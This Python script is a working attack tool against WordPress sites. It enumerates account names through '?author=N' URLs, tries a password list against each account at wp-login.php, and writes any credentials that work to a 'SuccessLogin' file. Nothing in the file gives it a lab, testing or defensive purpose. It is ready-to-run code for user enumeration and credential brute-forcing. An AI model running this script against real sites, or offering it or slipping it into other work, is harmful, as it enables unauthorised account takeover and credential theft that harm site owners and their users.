import sys
import requests
import urllib
from lxml import html
import mechanicalsoup

ACCOUNT_AMOUNT_TO_GET = 100

def getCmdArguments():
    return sys.argv[1:]


def getAdminsLogins(server):
    logins_list = []

    page = requests.get('http://' + server + "?author=3")

    for i in range(1, ACCOUNT_AMOUNT_TO_GET):
        admin_reveal_link = ('http://{}?author={}').format(server, i)
        page = requests.get(admin_reveal_link)
        html_tree = html.fromstring(page.content)
        href_attribute = html_tree.xpath("//*[contains(@href,'author')]/@href")
        if len(href_attribute) == 0:
            break
        login = str(href_attribute).split("author/")[1]
        login = login.split("/feed")[0]
        login = login.replace("-", " ")
        logins_list.append(login)

    return logins_list


def try_to_login(server, login):
    URL = "http://{}/wp-login.php".format(server)
    browser = mechanicalsoup.Browser()

    # request login page
    login_page = browser.get(URL)

    # we grab the login form
    login_form = login_page.soup.find("form", {"id": "loginform"})

    with open('Passwords',
              "r") as passwordsFile:
        password = passwordsFile.readline()
        while len(password) != 0:
            # find login and password inputs
            login_form.find("input", {"name": "log"})["value"] = login
            login_form.find("input", {"name": "pwd"})["value"] = password

            # submit form
            response = browser.submit(login_form, login_page.url)
            if (str(response.url).__contains__("wp-admin")):
                print("Login SUCCESS for {} - {}".format(login, password))
                file = open("SuccessLogin", "a")
                file.write("{} : {}".format(login, password))
                file.close()
                break
            # else:
                # print("Login failed for password: {}".format(password))
            password = passwordsFile.readline()


if __name__ == "__main__":
    servers = getCmdArguments()

    for server in servers:
        with open("SuccessLogin", "a") as successLoginFile:
            successLoginFile.write("\n------- Server: {} -------\n".format(server))

        logins = getAdminsLogins(server)
        print(logins)
        for login in logins:
            try_to_login(server, login)
